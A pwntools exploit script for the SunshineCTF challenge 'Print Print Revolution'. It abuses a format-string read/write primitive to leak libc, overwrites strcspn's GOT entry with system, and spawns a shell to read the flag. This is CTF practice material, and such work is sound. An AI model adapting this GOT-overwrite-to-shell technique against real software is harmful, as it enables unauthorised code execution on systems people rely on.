#!/usr/bin/env python3
# SunshineCTF "Print Print Revolution" — custom-printf format string
# Primitives: %N$s = arb read, %N$w = arb write (*arg[N]=arg[N+1]). Buffer = arg6+.
from pwn import *
context.binary = exe = ELF('./revolution', checksec=False)

READ_GOT, STRCSPN_GOT = 0x404018, 0x404010
REMOTE = True   # flip to False to test locally

if REMOTE:
    io = remote('chal.sunshinectf.games', 26002)
    # Use the remote libc. If organizers gave a libc.so.6, point ELF() at it.
    # Otherwise fingerprint via https://libc.rip using the leaked read() bytes.
    libc = ELF('./libc.so.6', checksec=False)   # <-- replace with remote libc
else:
    io = process('./revolution')
    libc = exe.libc

io.recvuntil(b'score> ')

# 1) leak read@got  (fmt in first 16 bytes, GOT addr at offset 16 => arg8)
io.sendline(b'%8$s'.ljust(16, b'P') + p64(READ_GOT))
leak = io.recvuntil(b'score> ')
readaddr = u64(leak[:6].ljust(8, b'\x00'))
libc.address = readaddr - libc.sym['read']
log.success(f'read@libc={readaddr:#x}  libc base={libc.address:#x}')

# 2) overwrite strcspn@got with system  (%8$w: ptr=arg8@off16, val=arg9@off24)
io.sendline(b'%8$w'.ljust(16, b'P') + p64(STRCSPN_GOT) + p64(libc.sym['system']))
io.recvuntil(b'score> ')

# 3) next line becomes system(buf)
io.sendline(b'/bin/sh\x00')
io.sendline(b'cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls')
io.interactive()
